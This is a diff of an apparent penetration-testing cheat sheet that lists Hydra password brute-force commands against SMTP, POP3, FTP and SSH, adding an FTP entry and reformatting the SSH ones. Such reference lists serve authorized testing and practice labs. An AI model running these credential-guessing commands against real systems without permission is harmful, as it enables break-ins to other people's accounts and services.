@@ -13,12 +13,12 @@ hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
 				POP3 Brute Force
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
 
+				FTP
+hydra  -l admin -P wordlists.txt -vV $IP ftp
 
-				SSH Bruteforce password
-hydra -l username -P wordlist IP ssh
+				SSH
+### Bruteforce password
+`hydra -l username -P wordlist.txt $IP ssh`
 
-				SSH Bruteforce Username
-hydra -L wordlist -p password IP ssh
-
-				SSH Bruteforce Username and Password
-hydra -L users.txt -P passwords.txt -t 1 -u $ip ssh
+### Bruteforce Username and Password
+`hydra -L users.txt -P passwords.txt -t 1 -u $ip ssh`
